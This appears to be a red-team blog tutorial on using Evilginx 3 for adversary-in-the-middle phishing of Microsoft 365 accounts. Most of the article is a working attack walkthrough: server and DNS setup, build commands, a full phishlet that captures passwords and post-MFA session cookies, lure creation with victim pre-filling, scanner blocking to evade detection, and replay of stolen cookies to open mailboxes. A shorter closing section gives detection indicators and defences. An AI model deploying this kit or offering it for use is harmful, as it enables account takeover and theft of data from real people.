---
title: 'Evilginx 3: AiTM Phishing and MFA Bypass for Red Teams'
slug: evilginx3-aitm-mfa-bypass
description: 'Learn how Evilginx 3 enables AiTM phishing, captures post-MFA cookies, and helps red teams understand MFA-bypass risks in Microsoft 365.'
image: /evilginx3-aitm-mfa-bypass.webp
draft: false
date: 2026-06-19T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - session hijacking
  - Microsoft MFA bypass
  - phishing
---

# Evilginx 3: Complete Guide to AiTM Phishing, MFA Bypass, and Session Cookie Theft

Multi-factor authentication doesn't stop Adversary-in-the-Middle phishing. The technique doesn't bypass MFA — it lets the victim complete it normally, then steals the session cookie Microsoft issues afterward. The attacker never touches the MFA step. They take what comes out of it.

Evilginx 3 is the open-source red team framework for demonstrating this attack class in authorized engagements. Written in Go by security researcher Kuba Gretzky, it runs a self-contained reverse proxy with its own HTTP and DNS server — no nginx dependency, no external daemons. This article covers the full red team workflow: infrastructure, installation, phishlet structure, session capture, and the detection indicators every blue team should know.

***

## What Is an AiTM Attack?

In a classic AiTM attack, the attacker's server sits between the victim and the legitimate service. The victim interacts with the real login page, completes MFA, and authenticates successfully — the entire session passes through the attacker's reverse proxy in real time. For a broader look at how man-in-the-middle techniques work at the network level, see [HackITA's guide to MITM attacks](https://hackita.it/articoli/man-in-the-middle/).

The moment the legitimate service (e.g., Microsoft) issues the authenticated session cookie, Evilginx intercepts it. That cookie represents a valid, post-MFA authenticated session. Replaying it from another machine opens the victim's account without triggering any new authentication challenge.

This is fundamentally different from traditional credential phishing. Stolen credentials alone are useless if MFA is enforced. A stolen post-MFA session cookie is immediately actionable.

***

## Infrastructure Requirements

A working Evilginx 3 red team setup requires a VPS with a public IP and a domain you control. Evilginx acts as the authoritative DNS server for your domain — this is what allows it to automatically provision subdomains as each phishlet requires.

Set the domain's nameserver glue records to your VPS IP at the registrar level. Most registrars (Namecheap, GoDaddy, Porkbun) support this under "Custom Nameservers" or "Host Records." The glue record maps your nameserver hostname (e.g., `ns1.yourdomain.com`) to your VPS IP — this allows DNS resolution to reach Evilginx before any `A` records exist.

Ports that must be open inbound on the VPS: 80 (HTTP), 443 (HTTPS), 53 (DNS, both TCP and UDP).

***

## Installation

Install Go and build dependencies on Ubuntu:

```bash
sudo apt update && sudo apt install git make gcc libpcap-dev -y
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

If a local DNS resolver is already binding port 53, disable it before starting Evilginx — otherwise the bind will fail:

```bash
sudo systemctl disable systemd-resolved --now
```

Clone the [official repository](https://github.com/kgretzky/evilginx2) and build:

```bash
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
```

Run as root with the phishlets directory specified:

```bash
sudo ./build/evilginx -p ./phishlets
```

***

## Initial Configuration

Evilginx drops you into an interactive shell on first launch. The two mandatory setup commands set your phishing domain and external VPS IP:

```
config domain <your-phishing-domain>
config ipv4 external <your-vps-ip>
```

To block automated scanners from hitting your infrastructure — threat intel crawlers will probe any newly issued TLS certificate within hours of it appearing in CT logs:

```
blacklist unauth
```

Evilginx uses Let's Encrypt to auto-provision TLS certificates when a phishlet is enabled. DNS must be resolving through your VPS before enabling any phishlet — otherwise the certificate request fails. Verify propagation with `dig NS yourdomain.com` before proceeding. For a deep dive into how TLS/SSL works at the protocol level, refer to [HackITA's TLS & SSL guide](https://hackita.it/articoli/tls-ssl/).

***

## Phishlet Structure and Anatomy

Phishlets are YAML configuration files that define how Evilginx proxies a specific authentication flow. Each phishlet specifies: which hostnames to proxy, which cookies to capture, which POST fields contain credentials, and which URL signals authentication has completed. The full phishlet format specification is documented on [help.evilginx.com](https://help.evilginx.com/docs/phishlet-format).

The following is a verified phishlet structure for Microsoft 365, sourced from public security research (Daniel Underhay, dunderhay.github.io):

```yaml
name: 'Microsoft 365'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT', 'SignInStateCookie:always']
    type: 'cookie'

credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/?auth=2'
```

Breaking down the critical fields:

**`proxy_hosts`** — lists every Microsoft subdomain Evilginx impersonates. The `session: true` flag on `login.microsoftonline.com` tells Evilginx this is the primary authentication host. `auto_filter: true` enables automatic URL rewriting in responses — without this, the victim's browser starts hitting Microsoft's real servers directly, breaking the proxy chain.

**`auth_tokens`** — defines exactly which cookies to extract. `ESTSAUTH` is the short-lived session token. `ESTSAUTHPERSISTENT` is the long-lived "Keep me signed in" token, valid up to 90 days. `SignInStateCookie` tracks authentication state. Capturing all three gives a complete session that doesn't prompt for re-authentication.

**`credentials`** — captures the username and password from the proxied POST request. The regex patterns match Microsoft's login form field names, which vary slightly across different authentication flows.

**`login`** — defines the landing URL. When a target hits your lure, Evilginx redirects them to this path on your proxied `login.microsoftonline.com`.

Place the YAML in the `phishlets/` directory. Evilginx loads it automatically.

***

## Enabling Phishlets and Generating Lure URLs

Activate the phishlet and bind it to your domain:

```
phishlets hostname m365 <your-phishing-domain>
phishlets enable m365
```

Verify the phishlet status and certificate provisioning:

```
phishlets
```

Create a lure — a tracked URL tied to a specific phishlet:

```
lures create m365
lures get-url 0
```

Modify the default redirect URL so targets land somewhere convincing after authentication completes:

```
config redirect_url https://office.com
```

To pre-populate the victim's email address in the login field (increases conversion in targeted engagements):

```
lures edit 0 username target@company.com
```

Run `help lures` inside Evilginx for the full list of lure parameters.

***

## Session Capture and Cookie Reuse

When a target authenticates through your lure, captured sessions appear automatically. List all captured sessions:

```
sessions
```

Show full detail for a specific session, including credentials and cookies:

```
sessions 1
```

The output includes the captured `ESTSAUTH` and `ESTSAUTHPERSISTENT` cookies alongside username and password. Import these cookies into a browser using a cookie management extension, navigate to `https://outlook.office365.com`, and the session opens without any authentication prompt — MFA already passed on Microsoft's servers.

***

## GoPhish Integration (Evilginx 3.3+)

As of version 3.3, Evilginx supports official integration with a forked version of GoPhish for managing phishing campaigns. This allows tracking email opens, lure URL clicks, and session captures from a single dashboard.

Configure the GoPhish connection from inside Evilginx:

```
config gophish admin_url https://<gophish-ip>:<port>
config gophish api_key <your-api-key>
config gophish test
```

The forked GoPhish repository is maintained at `github.com/kgretzky/gophish`. The integration is documented in detail on breakdev.org.

***

## What Blue Teams Should Be Looking For

AiTM attacks are invisible at the perimeter — the victim authenticates legitimately, MFA completes, and no anomalous authentication event fires. Detection must happen post-authentication, in identity logs.

Key indicators in Microsoft Entra ID sign-in logs:

The IP that completed MFA differs from the IP that subsequently uses the session. Evilginx proxies authentication from the VPS IP. The attacker replays the cookie from a different IP. That gap is visible in Entra's Continuous Access Evaluation logs if correlation is enabled.

Default Evilginx TLS certificates embed `Evilginx Signature Trust Co.` as the Organization field and `Evilginx Super-Evil Root CA` as the Common Name. Certificate transparency monitoring (crt.sh, Censys) flags these strings. Threat intel platforms index them within hours of issuance.

Default lure URLs use an 8-character mixed-case random path — this pattern is fingerprinted by email security gateways and threat intelligence feeds. Newly registered domains with Let's Encrypt certificates and 8-character URL paths targeting Microsoft infrastructure are high-confidence AiTM indicators.

FIDO2 hardware keys and passkeys are the only authentication mechanism that defeats this attack class at the protocol level. Both bind the authentication assertion to the origin domain — a proxied FIDO2 challenge fails because the domain in the request doesn't match the domain the credential was registered against.

***

## Frequently Asked Questions

**Does Evilginx 3 work against Microsoft's MFA?**
Yes, against TOTP, push notifications, and SMS. Not against FIDO2/passkeys — those are phishing-resistant by design.

**What changed between Evilginx 2 and Evilginx 3?**
Version 3 switched TLS management to certmagic for auto-renewal, added support for session tokens in HTTP response bodies and headers (not just cookies), dropped built-in phishlets from the main repository, and changed the configuration format to JSON. Phishlets remain in YAML.

**Where are community phishlets for Evilginx 3?**
The main repository no longer ships example phishlets. Community collections exist on GitHub — search `evilginx3 phishlets`. The official Evilginx Mastery course (academy.breakdev.org) covers custom phishlet development.

**Is Evilginx detectable on the network?**
Yes. Default deployments leave multiple fingerprints: CT log entries with known Organization strings, 8-character lure URL paths, Let's Encrypt certificates on newly registered domains, and session replay from a different IP than the one that completed MFA.
